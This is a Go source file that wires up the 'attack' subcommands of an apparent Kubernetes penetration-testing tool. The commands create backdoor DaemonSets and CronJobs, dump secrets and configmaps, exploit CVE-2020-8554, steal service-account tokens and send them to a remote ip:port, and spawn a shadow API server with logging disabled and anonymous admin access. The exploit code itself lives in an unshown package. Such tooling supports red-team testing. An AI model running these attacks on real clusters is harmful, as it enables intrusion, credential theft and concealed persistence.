/*
Copyright © 2021 Zuoyu Qiu <17803091056@sjtu.edu.cn>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"github.com/KPT/attack"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
)

var daemonsetCmd = &cobra.Command{
	Use:     "daemonset [token] [namespace] [image] [command]",
	Short:   "Create backdoor daemonset",
	Example: `daemonset default default nginx "echo hello world; sleep infinity"`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) != 4 {
			log.Println("invalid input args.")
			log.Fatal("deploy image to every node using daemonset, usage: kpt attack daemonset [default|anonymous|<service-account-token-path>] [namespace] [image] [cmd]")
			return
		}
		attack.K8sBackDoorDaemonset(args[0], args[1], args[2], args[3])
	},
}

var configCmd = &cobra.Command{
	Use:   "configmap",
	Short: "dump k8s configmaps",
	Long:  "Dump all Kubernetes configmaps when current Pod has access to configmaps.",
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) != 1 {
			log.Println("invalid input args.")
			log.Fatal("try to dump K8s configmap in multiple ways, usage: kpt attack configmap [anonymous|<service-account-token-path>]")
			return
		}
		attack.K8sConfigMapsDump(args[0])
	},
}

var mitmCmd = &cobra.Command{
	Use:     "mitm",
	Short:   "Exploit CVE-2020-8554",
	Example: `mitm [default|anonymous|<service-account-token-path>] [image] [ip] [port]`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) != 4 {
			log.Println("invalid input args.")
			log.Fatal("Exploit CVE-2020-8554: Man in the middle using ExternalIPs, usage: kpt attack mitm [default|anonymous|<service-account-token-path>] [image] [ip] [port]")
			return
		}
		attack.K8sMitmClusterip(args[0], args[1], args[2], args[3])
	},
}

var cronjobCmd = &cobra.Command{
	Use:     "cronjob",
	Short:   "create backdoor cronjob",
	Example: `cronjob [default|anonymous|<token-path>] [namespace] [min|hour|day|<cron-expr>] [image] [args]`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) != 5 {
			log.Println("invalid input args.")
			log.Fatal("create cronjob with user specified image and cmd. Usage: kpt attack cronjob [default|anonymous|<token-path>] [namespace] [min|hour|day|<cron-expr>] [image] [args]")
			return
		}
		attack.K8sCronJobDeploy(args[0], args[1], args[2], args[3], args[4])
	},
}

var getsaCmd = &cobra.Command{
	Use:     "getsa",
	Short:   "Use RBAC by pass to steal sa token",
	Example: `getsa [default|anonymous|<service-account-token-path>] [namespace] [target-service-account] [ip] [port]`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) != 5 {
			log.Println("invalid input args.")
			log.Fatal("Dump target service-account token and send it to remote ip:port, usage: kpt attack getsa [default|anonymous|<service-account-token-path>] [namespace] [target-service-account] [ip] [port]")
			return
		}
		attack.K8sGetSATokenViaCreatePod(args[0], args[1], args[2], args[3], args[4])
	},
}

var pspCmd = &cobra.Command{
	Use:     "getpsp",
	Short:   "dump k8s pod security policy",
	Long:    "Dump all Kubernetes pod security policy when current Pod has access.",
	Example: `getpsp [auto|<service-account-token-path>]`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) != 1 {
			log.Println("invalid input args.")
			log.Fatal("Dump K8S Pod Security Policies and try, usage: kpt attack getpsp [auto|<service-account-token-path>]")
			return
		}
		attack.K8SPodSecurityPolicy(args[0])
	},
}

var secretCmd = &cobra.Command{
	Use:     "secret",
	Short:   "dump k8s secrets",
	Long:    "Dump all Kubernetes secrets when current Pod has access.",
	Example: `secret [anonymous|<service-account-token-path>]`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) != 1 {
			log.Println("invalid input args.")
			log.Fatal("try to dump K8s secret in multiple ways, usage: kpt attack secret [anonymous|<service-account-token-path>]")
			return
		}
		attack.K8sSecretsDump(args[0])
	},
}

var shadowCmd = &cobra.Command{
	Use:     "shadow",
	Short:   "Create shadow API Server",
	Long:    "Create shadow API Server, duplicate kube-apiserver pod, disable logs and grant all privilege to anonymous user.",
	Example: `shadow [default|anonymous|<service-account-token-path>]`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) != 1 {
			log.Println("invalid input args.")
			log.Fatal("duplicate kube-apiserver pod, disable logs and grant all privilege to anonymous user. usage: kpt attack shadow [default|anonymous|<service-account-token-path>]")
			return
		}
		attack.K8sShadowApiServer(args[0])
	},
}

// AttckCmd represents the attack command
var attackCmd = &cobra.Command{
	Use:   "attack",
	Short: "Attck module of KPT",
	Long:  `Attck module is used to gather information within the container and in the cluster, which will be useful during exploit Kubernetes cluster.`,
}

func init() {
	rootCmd.AddCommand(attackCmd)
	attackCmd.AddCommand(daemonsetCmd, configCmd, mitmCmd, cronjobCmd, getsaCmd, pspCmd, secretCmd, shadowCmd)
	// Here you will define your flags and configuration settings.

	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	// Attck.PersistentFlags().String("foo", "", "A help for foo")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	// AttckCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}
